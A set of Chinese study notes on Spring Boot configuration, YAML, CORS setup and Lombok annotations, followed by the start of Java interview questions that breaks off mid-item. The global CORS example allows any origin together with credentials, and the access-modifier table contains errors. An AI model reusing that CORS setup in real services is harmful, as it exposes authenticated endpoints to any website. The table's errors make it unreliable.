配置类组件之间无依赖关系用Lite模式加速容器启动过程，减少判断 \n- 配置类组件之间有依赖关系，方法会被调用得到之前单实例组件，用Full模式\n\n**@Configuration, @Import, @ImportResource, @ConditionalOnBean, @Bean, @ConfigurationProperties, @EnableConfigurationPropertiesa组件的使用**\n```java\npublic class Pet {\n\tpublic String name;\n\tpublic Pet(){}\n\tpublic Pet(String name){this.name = name;}\n\tpublic void setName(String name) {this.name = name;}\n}\npublic class Student {\n\tpublic int id;\n\tpublic String name;\n\tpublic Student(){}\n\tpublic Student(int id, String name){\tthis.id = id; this.name = name;}\n}\npublic class User {\n\tpublic String name;\n\tpublic int age;\n\tpublic User(){}\n\tpublic User(String name, int age){this.name = name;this.age = age;}\n\tpublic void setName(String name) {this.name = name;}\n\tpublic void setAge(int age) {this.age = age;}\n}\n\n```\nCar.java\n```java\n/**\n * @ConfigurationProperties的作用是读取配置文件，通过反射给对象的属性注入值\n * 激活@ConfigurationProperties的两种方法:\n * 第一种方法是使用@Component,即让springboot将该组件添加到IOC容器中\n * 第二种方法是在配置类上添加注解@EnableConfigurationPropertiesa(Car.class),该注解有两个作用:一是激活Car类上的@ConfigurationProperties注解，二是将Car类添加到IOC容器中，\n */\n@Component\n@ConfigurationProperties(prefix = \"mycar\")\npublic class Car {\n\tpublic String brand;\n\tpublic int price;\n\tpublic Car(){ }\n\tpublic Car(String brand, int price){\n\t\tthis.brand = brand;\n\t\tthis.price = price;\n\t}\n\tpublic void setBrand(String brand){this.brand = brand;}\n\tpublic void setPrice(int price){this.price = price;}\n}\n```\n\napplication.properites\n```xml\n# 应用名称\nspring.application.name=mpdemo101\n\nmycar.brand=BYD\nmycar.price=100\n```\n\nbeans.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n  <bean id=\"user4\" class=\"com.atguigu.bean.User\">\n    <property name=\"name\" value=\"te\"></property>\n    <property name=\"age\" value=\"28\"></property>\n  </bean>\n  <bean id=\"pet1\" class=\"com.atguigu.bean.Pet\">\n    <property name=\"name\" value=\"lll\"></property>\n  </bean>\n</beans>\n```\n\nMyconfig.java\n```java\n/**\n * 配置类里面使用@Bean注解在方法上给容器注册组件，默认是单实例\n * IOC容器中也会生成配置类的实例,但该配置类组件的id默认不是类名\n * @Configuration注解中有一个proxyBeanMethods值，该值默认为true，该作用是表示通过IOC容器获得到的MyConfig实例，调用@Bean标注的方法所得到的实例都是容器中的实例，而不会单独new一个新实例。但是单独通过new得到的MyConifg, 调用@Bean标注的方法所得到的实例都是容器中的实例，会单独new一个新实例\n * @Import({类名.class, ...})给容器中自动添加指定的组件，组件的id默认为全类名。注：使用@Import添加的组件一定要有无参构造，否则会报错\n */\n@Import({Student.class, User.class})\n@ImportResource(\"classpath:beans.xml\")//用于将beans.xml文件中的bean加载到IOC容器中\n@Configuration(proxyBeanMethods = true)  //告诉SpringBoot这是一个配置类 == 配置文件\npublic class MyConfig {\n\n\t@Bean(\"tom\") // 将组件的id设置成\"tom\"\n\tpublic Pet tomcatPet(){\n\t\treturn new Pet(\"tomcat\");\n\t}\n\n\t@ConditionalOnBean(name = \"tom\") //当IOC容器中有id为tom的组件是，才会向IOC容器中添加下面的组件. 要额外注意组件的加载顺序\n\t@Bean // 给容器中添加组件，以方法名作为组件的id，返回类型作为组件类型，返回的值作为容器中的实例\n\tpublic User user01(){\n\t\treturn new User(\"whz\", 10);\n\t}\n}\n```\n\nMpdemo101Application.java\n```java\n@SpringBootApplication\npublic class Mpdemo101Application {\n\n\tpublic static void main(String[] args) {\n\t\t//返回IOC容器\n\t\tConfigurableApplicationContext run = SpringApplication.run(Mpdemo101Application.class, args);\n\n\t\t//查看容器里面的组件\n\t\tString[] names = run.getBeanDefinitionNames();\n\t\tfor(String name : names){\n\t\t\tSystem.out.println(name);\n\t\t}\n\n\t\t//从容器中获取组件\n\t\tUser user = run.getBean(\"user01\", User.class);\n\t\tSystem.out.println(user.name+\" \"+user.age); //输出：whz 10\n\n\t\t//证明配置类里面使用@Bean注解在方法上给容器注册组件，默认是单实例\n\t\tPet tom01 = run.getBean(\"tom\", Pet.class);\n\t\tPet tom02 = run.getBean(\"tom\", Pet.class);\n\t\tSystem.out.println(tom01 == tom02); //输出：true\n\n\t\t//证明IOC容器中也会生成配置类的实例\n\t\tMyConfig config = run.getBean(MyConfig.class);\n\t\tSystem.out.println(config); //输出：com.atguigu.config.MyConfig$$EnhancerBySpringCGLIB$$9b8399d3@f88bfbe\n\n\t\t//证明@Configuration注解中有一个proxyBeanMethods值，该值默认为true，该作用是表示通过IOC容器获得到的MyConfig实例，调用@Bean标注的方法所得到的实例都是容器中的实例，而不会单独new一个新实例\n\t\tUser user1 = config.user01();\n\t\tUser user2 = config.user01();\n\t\tSystem.out.println(user1 == user2); //输出：true\n\n\t\t//证明单独通过new得到的MyConifg, 调用@Bean标注的方法所得到的实例都是容器中的实例，会单独new一个新实例\n\t\tMyConfig config1 = new MyConfig();\n\t\tUser user3 = config1.user01();\n\t\tSystem.out.println(user1 == user3); //输出：false\n\n\t\t//证明@Import({类名.class, ...})能给容器中自动添加指定的组件\n\t\tStudent stu = run.getBean(Student.class);\n\t\tSystem.out.println(stu);// 输出：com.atguigu.bean.Student@ed91d8d\n\n\t\t//证明通过@Import({类名.class, ...})给容器中自动添加指定的组件，组件的id默认为全类名\n\t\tString[] beanNamesForType = run.getBeanNamesForType(User.class);\n\t\tfor(String s : beanNamesForType){\n\t\t\tSystem.out.print(s+\"  \"); //输出：com.atguigu.bean.User  user01  user4\n\t\t}\n\n\t\t//证明@ImportResource(\"classpath:beans.xml\")用于将beans.xml文件中的bean加载到IOC容器中\n\t\tUser user4 = run.getBean(\"user4\", User.class);\n\t\tSystem.out.println(user4.name); //输出：te\n\t\tPet pet1 = run.getBean(\"pet1\", Pet.class);\n\t\tSystem.out.println(pet1.name); //输出：lll\n\n\t\t//证明@ConfigurationProperties的作用是读取配置文件，通过反射给对象的属性注入值\n\t\tCar car = run.getBean(Car.class);\n\t\tSystem.out.println(car.brand+\" \"+car.price); //输出：BYD 100\n\t}\n}\n```\n\n# yaml\nspringboot支持两种文件类型的配置文件，一种是properties类型，另一种是yaml类型\n我们可以同时写上两个配置文件，一个是properties，一种是yaml, 它们都会被springboot读取\n\n注：springboot默认配置文件名为application, 如果是其他名字，springboot会无法识别该文件是配置文件\n\n\nYAML 是 \"YAML Ain't Markup Language\"（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：\"Yet Another Markup Language\"（仍是一种标记语言）。 \n\n非常适合用来做以数据为中心的配置文件 \n\n**基本语法**\n- `key: value` kv之间有空格 \n- 大小写敏感 \n- 使用缩进表示层级关系 缩进不允许使用tab，只允许空格 \n- 缩进的空格数不重要，只要相同层级的元素左对齐即可 \n- '#'表示注释 \n- 字符串无需加引号，如果要加，''与\"\"表示字符串内容会被不转义/转义 \n\n**数据类型**\n- 字面量：单个的、不可再分的值。date、boolean、string、number、null \n```yaml\nk: v\n```\n- 对象：键值对的集合。map、hash、object \n```yaml\n#行内写法:\nk: {k1:v1, k2:v2, k3:v3} \n#或\nk:\n k1: v1\n k2: v2\n k3: v3\n```\n- 数组：一组按次序排列的值。array、list、queue 、set\n```yaml\n#行内写法：\nk: [v1, v2, v3]\n#或\nk:\n - v1\n - v2\n - v3\n```\n\n**示例**\n```java\n@ConfigurationProperties(prefix = \"person\")\n@Component\n@AllArgsConstructor\n@NoArgsConstructor\n@Data\n@ToString\npublic class Person {\n\tprivate String userName;\n\tprivate Boolean boss;\n\tprivate Date birth;\n\tprivate Pet pet;\n\tprivate String[] interests;\n\tprivate List<String> animal;\n\tprivate Map<String, Object> score;\n\tprivate Set<Double> salarys;\n\tprivate Map<String, List<Pet>> allPets;\n}\n```\n\napplication.yml\n```yaml\nperson:\n  userName: whz\n  boss: true\n  birth: 1999/03/03\n  pet:\n    name: dog\n  interests: [篮球, 台球]\n  animal: [猫, 狗]\n  score: {english:90, math:100}\n  salarys:\n    - 8888.8\n    - 9999.9\n  allPets:\n    sick:\n      - {name: 阿猫}\n      - {name: 阿狗}\n    health:\n      - {name: 阿福}\n```\n\n**编写配置文件显示提示**\n编写自定义的类和配置文件一般没有提示，如想要提示，可以添加如下代码\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n    <optional>true</optional>\n</dependency>\n```\n建议添加如下代码，防止打包项目时把spring-boot-configuration-processor打包进去\n```xml\n<project>\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-maven-plugin</artifactId>\n        <configuration>\n          <excludes>\n            <exclude>\n              <groupId>org.springframework.boot</groupId>\n              <artifactId>spring-boot-configuration-processor</artifactId>\n            </exclude>\n          </excludes>\n        </configuration>\n      </plugin>\n    </plugins>\n  </build>\n</project>\n```\n\n# web开发\n## 静态资源目录\n在springboot搭建的web应用中的静态资源目录默认有如下四个\n- classpath:/static\n- classpath:/public\n- classpath:/resources\n- classpath:/META-INF/resources\n接下来，在main/resources下新建static、public和resources三个文件夹，分别放入a.png、b.png和c.png三张图片，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125112.png)\n\n启动项目，分别访问：\n```\nhttp://localhost:8083/a.png\nhttp://localhost:8083/b.png\nhttp://localhost:8083/c.png\n```\n发现都能正常访问相应的图片资源。那么说明，Spring Boot 默认会挨个从 public、resources和static 里面找是否存在相应的资源，如果有则直接返回。\n\n**再例如：**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125124.png)\n\n访问该empImg目录下的1.png图像的url为`localhost:8080/empImg/1.png`\n\n**设置静态路径目录**\n我们可以通过`spring.resources.static-locations=[classpath:/hah/, classpath:/hlll/]`来设置静态资源目录\n\n访问过程：请求过来，看有没有DispatcherServlet能处理，如果没有，则交给静态资源处理器处理，如果静态资源处理器不能处理，则报404\n\n**设置静态资源访问前缀**\n默认静态资源访问是`/**`\n此时访问静态资源的url: `项目根路径/静态资源名`\n\n我们可以通过`spring.mvc.static-path-patterns=/resources/**`来设置成`/resources/**`\n此时访问静态资源的url: `项目根路径/resources/静态资源名`\n\n## 欢迎页面与网页图标的支持\nspringboot会把自动把静态资源目录下的index.html文件当成欢迎页面\n当直接访问项目地址时，会自动跳转到欢迎页面\n\nspringboot还自动把静态资源目录下的favicon.ico文件当初网页的图标\n\n# 修改springboot默认配置\n一般有如下两种方式：\n- **自己手动添加组件，取代springboot自动配置类添加的组件**\nspringboot首先会加载所有的自动配置类(xxxxxAutoConfiguration.java), 每个自动配置类会根据条件是否成立来注入相应的组件，例如使用`CondiciontalOnMissingBean`注解，即注入组件的条件时IOC容器中没有该要注入的组件\n\n所以如果用户自己手动地向IOC容器中添加了组件，则springboot不会再将相应组件添加到IOC容器中\n\nspringboot中的HttpEncodingAutoConfiguration.java自动配置类中添加CharacterEncodingFilter组件代码如下：\n```java\n@Bean\n@ConditionalOnMissingBean\npublic CharacterEncodingFilter characterEncodingFilter(){...}\n```\n\n- 修改配置文件\n因为springboot的配置类所要添加的组件，默认都会使用`@ConfigurationProperties`来绑定配置文件的形式给属性注入值。由于我们可以通过修改配置文件，来实现自定义组件的属性。\n由于导入的包中配置文件与我们的项目的配置文件是共用的， 所以我们如果想要修改某个属性值，可以直接在自己项目的application.properites或application.yaml文件中添加修改即可\n\n# SpringBoot下开启事务\n核心是@EnableTransactionManager注解，该注解即为开启事务管理器。\n```java\n@Configuration\n@EnableTransactionManagement\npublic class TransactionConfiguration {\n \n    @Bean\n    @Qualifier(\"transactionManager\")\n    public PlatformTransactionManager txManager(@Qualifier(\"dataSource\") DataSource dataSource){\n        return new DataSourceTransactionManager(dataSource);\n    }\n}\n```\n开启后在需要使用事务的类或方法上标注@Transactional即可。\n\n# springboot 解决跨域\n## 1.返回新的CorsFilter(全局跨域)\n```java\n@Configuration\npublic class GlobalCorsConfig {\n    @Bean\n    public CorsFilter corsFilter() {\n        //1.添加CORS配置信息\n        CorsConfiguration config = new CorsConfiguration();\n          //放行哪些原始域\n          config.addAllowedOrigin(\"*\");\n          //是否发送Cookie信息\n          config.setAllowCredentials(true);\n          //放行哪些原始域(请求方式)\n          config.addAllowedMethod(\"*\");\n          //放行哪些原始域(头部信息)\n          config.addAllowedHeader(\"*\");\n          //暴露哪些头部信息（因为跨域访问默认不能获取全部头部信息）\n          config.addExposedHeader(\"*\");\n\n        //2.添加映射路径\n        UrlBasedCorsConfigurationSource configSource = new UrlBasedCorsConfigurationSource();\n        configSource.registerCorsConfiguration(\"/**\", config);\n\n        //3.返回新的CorsFilter.\n        return new CorsFilter(configSource);\n    }\n}\n```\n## 2. 重写WebMvcConfigurer（全局跨域）\n任意配置类，返回一个新的WebMvcConfigurer Bean，并重写其提供的跨域请求处理的接口，目的是添加映射路径和具体的CORS配置信息。\n```java\n@Configuration\npublic class GlobalCorsConfig {\n    @Bean\n    public WebMvcConfigurer corsConfigurer() {\n        return new WebMvcConfigurer() {\n            @Override\n            //重写父类提供的跨域请求处理的接口\n            public void addCorsMappings(CorsRegistry registry) {\n                //添加映射路径\n                registry.addMapping(\"/**\")\n                        //放行哪些原始域\n                        .allowedOrigins(\"*\")\n                        //是否发送Cookie信息\n                        .allowCredentials(true)\n                        //放行哪些原始域(请求方式)\n                        .allowedMethods(\"GET\",\"POST\", \"PUT\", \"DELETE\")\n                        //放行哪些原始域(头部信息)\n                        .allowedHeaders(\"*\")\n                        //暴露哪些头部信息（因为跨域访问默认不能获取全部头部信息）\n                        .exposedHeaders(\"Header1\", \"Header2\");\n            }\n        };\n    }\n}\n```\n## 3. 使用注解（局部跨域）\n在方法上（@RequestMapping）使用注解 @CrossOrigin ：\n```java\n@RequestMapping(\"/hello\")\n@ResponseBody\n@CrossOrigin(\"http://localhost:8080\") \npublic String index( ){\n    return \"Hello World\";\n}\n```\n或者在控制器（@Controller）上使用注解 @CrossOrigin ：\n```java\n@Controller\n@CrossOrigin(origins = \"http://xx-domain.com\", maxAge = 3600)\npublic class AccountController {\n\n    @RequestMapping(\"/hello\")\n    @ResponseBody\n    public String index( ){\n        return \"Hello World\";\n    }\n}\n```\n\n## 4. 手工设置响应头（局部跨域 ）\n使用HttpServletResponse对象添加响应头（Access-Control-Allow-Origin）来授权原始域，这里Origin的值也可以设置为\"*\" ，表示全部放行。\n```java\n@RequestMapping(\"/hello\")\n@ResponseBody\npublic String index(HttpServletResponse response){\n    response.addHeader(\"Access-Control-Allow-Origin\", \"http://localhost:8080\");\n    return \"Hello World\";\n}\n```\n\n## spring Security下跨域\n<font>在结合spring Security使用跨域配置时，一定要在springsecurity配置中加上cors()来开启跨域</font>\n```java\n http.cors()\n```\n\n# SpringBoot配置文件加载位置和属顺序\n## 读取顺序\n在编写SpringBoot主配置文件时，文件名可以是application-{profile}.properties或者application-{profile}.yml，但默认使用application-{profile}.properties的配置。当SpringBoot启动时，会依次扫描以下位置的application.properties或者application.yml文件，来作为SpringBoot的默认配置文件：\n1. 第一个位置：当前项目的根文件夹下的config文件夹\n```\n–file:./config/  \n```\n2. 第二个位置：当前项目的根文件夹下\n```\n–file:./\t\n```\n3. 第三个位置：类路径下的config文件夹下\n```\n–classpath:/config/ \n```\n4. 第四个位置：类路径下\n```\n–classpath:/\t\n```\n\n具体的路径结构如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220219113726.png)\n\n## 注意\n\n1. 四个位置的优先级由高到底，高优先级的配置会覆盖低优先级的配置；\n2.SpringBoot会从这四个位置全部加载主配置文件；互补配置；（即有相同的配置，采用高优先级的配置文件，没有相同的配置，都生效）\n3. 还可以通过spring.config.location配置项来改变默认的配置文件位置，该作用主要用于：\n\n项目打包好以后，可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置，指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；\n\n例子如下：如采用F盘下的application.properties文件作为SpringBoot的配置文件\n\n```\njava -jar spring-boot-helloworld-quick-SNAPSHOT.jar --spring.config.location=F:/application.properties\n```\n"
  },
  {
    "title": "./notes/back-end/Lombok.md",
    "body": "# 介绍\n在项目中使用Lombok可以减少很多重复代码的书写。比如说getter/setter/toString等方法的编写。\n\n# IDEA中的安装\n打开IDEA的Setting –> 选择Plugins选项 –> 选择Browse repositories –> 搜索lombok –> 点击安装 –> 安装完成重启IDEA –> 安装成功\n\n# 引入依赖\n在项目中添加Lombok依赖jar，在pom文件中添加如下部分。(不清楚版本可以在Maven仓库中搜索)\n```xml\n\t<dependency>\n\t    <groupId>org.projectlombok</groupId>\n\t    <artifactId>lombok</artifactId>\n\t    <version>1.16.18</version>\n\t    <scope>provided</scope>\n\t</dependency>\n```\n# 使用\n在对应的类或者方法上使用对应注解即可。\nLombok有哪些注解\n```\n@Setter\n@Getter\n@Data\n@Log(这是一个泛型注解，具体有很多种形式)\n@AllArgsConstructor\n@NoArgsConstructor\n@EqualsAndHashCode\n@NonNull\n@Cleanup\n@ToString\n@RequiredArgsConstructor\n@Value\n@SneakyThrows\n@Synchronized\n```\n注解详情\n## log\n注解在 类 上。有如下可选择可用：\n```java\n    1 \t//@CommonsLog\n    2 \tprivate static final org.apache.commons.logging.Log log = org.apache.commons.logging.LogFactory.getLog(LogExample.class);\n    3 \t//@JBossLog\n    4 \tprivate static final org.jboss.logging.Logger log = org.jboss.logging.Logger.getLogger(LogExample.class);\n    5 \t//@Log\n    6 \tprivate static final java.util.logging.Logger log = java.util.logging.Logger.getLogger(LogExample.class.getName());\n    7 \t//@Log4j\n    8 \tprivate static final org.apache.log4j.Logger log = org.apache.log4j.Logger.getLogger(LogExample.class);\n    9 \t//@Log4j2\n   10 \tprivate static final org.apache.logging.log4j.Logger log = org.apache.logging.log4j.LogManager.getLogger(LogExample.class);\n   11 \t//@Slf4j\n   12 \tprivate static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(LogExample.class);\n   13 \t//@XSlf4j\n   14 \tprivate static final org.slf4j.ext.XLogger log = org.slf4j.ext.XLoggerFactory.getXLogger(LogExample.class);\n   15 \n```\n默认情况下，记录器的主题（或名称）将是使用注释进行@Log注释的类的类名称。这可以通过指定topic参数来定制。例如：@XSlf4j(topic=\"reporting\")。\n\n## @Getter和@Setter (Back to Top)\n该注解使用在类或者属性上，该注解可以使用在类上也可以使用在属性上。生成的getter遵循布尔属性的约定。例如：boolean类型的sex,getter方法为isSex而不是getSex\n在使用该注解时，会默认生成一个无参构造。和对应的getterhe setter方法 \n\n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928140917.png\" width=\"700px\"/>\n\n该注解也可以使用在单个属性上，会默认生成一个无参构造： \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928140959.png\" width=\"700px\"/>\n\n## @Data (Back to Top)\n该注解使用在类上，该注解会提供getter、setter、equals、canEqual、hashCode、toString方法。\n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141031.png\" width=\"700px\"/>\n\n## @NonNull (Back to Top)\n该注解使用在属性上，该注解用于属的非空检查，当放在setter方法的字段上，将生成一个空检查，如果为空，则抛出NullPointerException。 \n该注解会默认是生成一个无参构造。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141227.png\" width=\"700px\"/>\n\n## @toString (Back to Top)\n该注解使用在类上，该注解默认生成任何非讲台字段以名称-值的形式输出。 \n1、如果需要可以通过注释参数includeFieldNames来控制输出中是否包含的属性名称。 \n2、可以通过exclude参数中包含字段名称，可以从生成的方法中排除特定字段。 \n3、可以通过callSuper参数控制父类的输出。\n\n1. includeFieldNames是否包含属性名称： \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141333.png\" width=\"700px\"/>\n\n2. exclude 排除指定字段 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141357.png\" width=\"700px\"/>\n3. callSuper输出父类属性 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141420.png\" width=\"700px\"/>\n注意：父类也要有toString方法，不然打印的是对象内存地址\n```java\n    1 \t//父类无toString方法\n    2 \tPerson(super=com.motui.Person@3abfe836, firstName=motui, address=北京, dateOfBirth=Tue Jan 09 11:49:05 CST 2018, sex=true)\n    3 \t//父类有toString方法\n    4 \tPerson(super=People(id=111), firstName=motui, address=北京, dateOfBirth=Tue Jan 09 11:50:11 CST 2018, sex=true)\n```\n\n## @EqualsAndHashCode (Back to Top)\n该注解使用在类上，该注解在类级别注释会同时生成equals和hashCode。 \n注意继承关系的时候该注解的使用。详细介绍参照官方介绍 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141457.png\" width=\"700px\"/>\n存在继承关系需要设置callSuper参数为true。\n\n## @Data (Back to Top)\n该注解使用在类上，该注解是最常用的注解，它结合了@ToString，@EqualsAndHashCode， @Getter和@Setter。本质上使用@Data注解，类默认@ToString和@EqualsAndHashCode以及每个字段都有@Setter和@getter。该注解也会生成一个公共构造函数，可以将任何@NonNull和final字段作为参数。\n\n虽然@Data注解非常有用，但是它没有与其他注解相同的控制粒度。@Data提供了一个可以生成静态工厂的单一参数，将staticConstructor参数设置为所需要的名称，Lombok自动生成的构造函数设置为私有，并提供公开的给定名称的静态工厂方法。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141524.png\" width=\"700px\"/>\n\n\n## @AllArgsConstructor (Back to Top)\n该注解使用在类上，该注解提供一个全参数的构造方法，默认不提供无参构造。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141557.png\" width=\"700px\"/>\n\n\n## @NoArgsConstructor (Back to Top)\n该注解使用在类上，该注解提供一个无参构造 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141630.png\" width=\"700px\"/>\n\n\n## @RequiredArgsConstructor (Back to Top)\n该注解使用在类上，使用类中所有**带有 @NonNull 注解的或者带有 final 修饰的成员变量**生成对应的构造方法。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141701.png\" width=\"700px\"/>\n\n## @Value (Back to Top)\n这个注解用在 类 上，会生成含所有参数的构造方法，get 方法，此外还提供了equals、hashCode、toString 方法。 \n注意：没有setter \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141740.png\" width=\"700px\"/>\n\n## @Cleanup (Back to Top)\n该注解使用在属性前，该注解是用来保证分配的资源被释放。在本地变量上使用该注解，任何后续代码都将封装在try/finally中，确保当前作用于中的资源被释放。默认@Cleanup清理的方法为close，可以使用value指定不同的方法名称。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141803.png\" width=\"700px\"/>\n\n## @Synchronized (Back to Top)\n该注解使用在类或者实例方法上，Synchronized在一个方法上，使用关键字可能会导致结果和想要的结果不同，因为多线程情况下会出现异常情况。Synchronized \n关键字将在this示例方法情况下锁定当前对象，或者class讲台方法的对象上多锁定。这可能会导致死锁现象。一般情况下建议锁定一个专门用于此目的的独立锁，而不是允许公共对象进行锁定。该注解也是为了达到该目的。 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141823.png\" width=\"700px\"/>\n\n## @SneakyThrows (Back to Top)\n该注解使用在方法上，这个注解用在 方法 上，可以将方法中的代码用 try-catch 语句包裹起来，捕获异常并在 catch 中用 Lombok.sneakyThrow(e) 把异常抛出，可以使用 @SneakyThrows(Exception.class) 的形式指定抛出哪种异常。该注解需要谨慎使用。详情参看官方介绍 \n<img src=\"https://gitee.com/naiswang/images/raw/master/20190928141846.png\" width=\"700px\"/>\n\n## @Accessors用法\nAccessor的中文含义是存取器，@Accessors用于配置getter和setter方法的生成结果，下面介绍三个属性\n\n### fluent\nfluent的中文含义是流畅的，设置为true，则getter和setter方法的方法名都是基础属性名，且setter方法返回当前对象。如下\n```java\n@Data\n@Accessors(fluent = true)\npublic class User {\n    private Long id;\n    private String name;\n    \n    // 生成的getter和setter方法如下，方法体略\n    public Long id() {}\n    public User id(Long id) {}\n    public String name() {}\n    public User name(String name) {}\n}\n```\n### chain\nchain的中文含义是链式的，设置为true，则setter方法返回当前对象。如下\n```java\n@Data\n@Accessors(chain = true)\npublic class User {\n    private Long id;\n    private String name;\n    \n    // 生成的setter方法如下，方法体略\n    public User setId(Long id) {}\n    public User setName(String name) {}\n}\n```\n\n### prefix\nprefix的中文含义是前缀，用于生成getter和setter方法的字段名会忽视指定前缀（遵守驼峰命名）。如下\n```java\n@Data\n@Accessors(prefix = \"p\")\nclass User {\n\tprivate Long pId;\n\tprivate String pName;\n\t\n\t// 生成的getter和setter方法如下，方法体略\n\tpublic Long getId() {}\n\tpublic void setId(Long id) {}\n\tpublic String getName() {}\n\tpublic void setName(String name) {}\n}\n```"
  },
  {
    "title": "./notes/back-end/java面试.md",
    "body": "# java基础\n## 什么是字节码，采用字节码的好处\n字节码：java经过虚拟机编辑器编译后产生的文件(即扩展为.class的文件)，它不面向任何特定的处理器，只面向虚拟机\n采用字节码的好处：Java语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以Java程序运行时比较高效，而且，由于字节码并不专对一种特定的机器，因此，Java程序无须重新编译便可在多种不同的计算机上运\n\n## java中的编译器和解释器\nJava中引入了虚拟机的概念，即在机器和编译程序之间加入了一层抽象的虚拟机器。这台虚拟的机器在任何平台上都提供给编译程序一个的共同的接口。编译程序只需要面向虚拟机，生成虚拟机能够理解的代码，然后由解释器来将虚拟机代码转换为特定系统的机器码执行。在Java中，这种供虚拟机理解的代码叫做字节码（即扩展为.class的文件），它不面向任何特定的处理器，只面向虚拟机。每一种平台的解释器是不同的，但是实现的虚拟机是相同的。Java源程序经过编译器编译后变成字节码，字节码由虚拟机解释执行，虚拟机将每一条要执行的字节码送给解释器，解释器将其翻译成特定机器上的机器码，然后在特定的机器上运行，这就是上面提到的Java的特点的编译与解释并存的解释。\n\n**流程：**\njava源代码 --> 编译器 --> jvm可执行的java字节码(即虚拟指令) --> jvm --> jvm中解释器 --> 机器码\n\n## java和C++的区别\n- 都是面向对象的语言，都支持封装、继承和多态\n- java不提供指针来直接访问内存，程序内存更加安全\n- java的类是单继承的，c++支持多继承；虽然java的类不可以多继承，但是接口可以多继承\n- java有自动内存管理机制，不需要程序员手动释放无用内存\n\n## java中的数据类型与类型转换\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123915.png)\n\nJava基本类型基本： byte,short,char  <  int  <  long  <  float  <  double\n表达式中的类型会自动提升到表达式中类型最高的一级\n\njava基本类型中基本高的不能自动转换为级别低的， 如果不进行强转，则会报错。\n使用`-=`, `+=`, `/=`, `%=`会自动完成完成强转转换，而`=`不行\n\njava中的整形常量默认为int型，声明long型常量可以在后面加`l`或`L`\njava中的浮点型常量默认为double型，声明float型常量可以在后面加`f`或`F`\n\n### float f = 3.5是否正确\n不正确\n\n### short s1=1; s1=s1+1有错吗？ short s1=1; s1+=1有错吗\n第一个有错，第二个没错\n\n## Switch是否能作用在byte、long、string上\n在java5以前，switch(expr)中，expr只能是byte、short、int、char。从java5开始，java中引入了枚举型，expr也可以是enum类型，从java7开始，expr还可以是String。\n其实，expr准确的说，数值型的只可以是int类型，但是 byte, short, char 都可以自动转换成 int 类型，所以expr也可以是byte, short, char。当然了，对应的包装类也是可以自动转换，所以x也可以是包装类型的。\n无论哪个版本的JDK，都是不支持 long，float，double，boolean 这个一定要注意！\n因为在Float/Double上执行精确的相等匹配通常是个坏主意。\n\n## Math.round(11.5)等于多少？Math.round(-11.5)等于多少\nMath.round(11.5)的返回值是12， Math.round(-11.5)的返回值是-11。四舍五入的原理是在参数上加0.5后向下取整\n\n## java采用何种编码方案？有何特点\n采用Unicode， 它为每个字符指定一个唯一的数值，因此在任何的语言、平台、程序都可以放心的使用\n\n## 访问修饰符\n|访问修饰符|在什么地方能使用`实例.属性`来访问|是否能被子类继承|能否用来修饰外部类|\n|--|--|--|--|\n|public|所有类|能|能|\n|protected|同一包内|能|不能|\n|默认(缺省),与默认方法区分开|同一包内|不能|不能|\n|private|同一类|不能|能|\n\n## &和&&区别\n首先&运算符有两种用法：一种是位运算符，另一种是逻辑运算符\n而&&是短路运算符，逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是true整个表达式的值才是true。&&之所以称为短路运算，是因为如果&&左边的表达式的值是false，右边的表达式会被直接短路掉，不会进行运算。而逻辑运算符一定是会把两端都算一边\n注意：`|`的`||`的区别也是如此\n```java\npublic static void main(String[] args){\n  int a = 10;\n  int b =1;\n  System.out.println(a > 1 | ++b >= 2);//true\n  System.out.println(b); //2\n}\n```\n\n## java有没有goto\ngoto是java中的保留字，在目前版本中的java没有使用\n\n## final有什么用\n- 被final修饰的类不可以被继承\n- 被final修饰的方法不可以被重写\n- 被final修饰的变量不可以被改变，被final修饰不可变的是变量的引用，而不是引用指向的内容，引用指向的内容是可以改变的\n\n## 抽象类能使用final修饰吗？\n不能，定义抽象类就是让其他类继承的，如果定义为final该类就不能被继承，这样彼此就会产生矛盾，所以final不能修饰抽象类\n\n## 对象实例域对象引用的区别\n对象引用是指向对象实例的\n\n## 内部类\n广义上的内部类可以分为下面四种：\n- 成员内部类\n- 静态内部类\n- 方法(局部)内部类\n- 匿名内部类\n\n### 成员内部类\n- 在一个类中除了可以定义成员变量、成员方法，还可以定义类，这样的类就被称为成员内部类，这个类所在的类称为外部类\n- 成员内部类可以访问外部类的所有成员，外部类要访问成员内部类的成员，必须要创建一个成员内部类的对象，再通过指向这个对象的引用来访问\n- 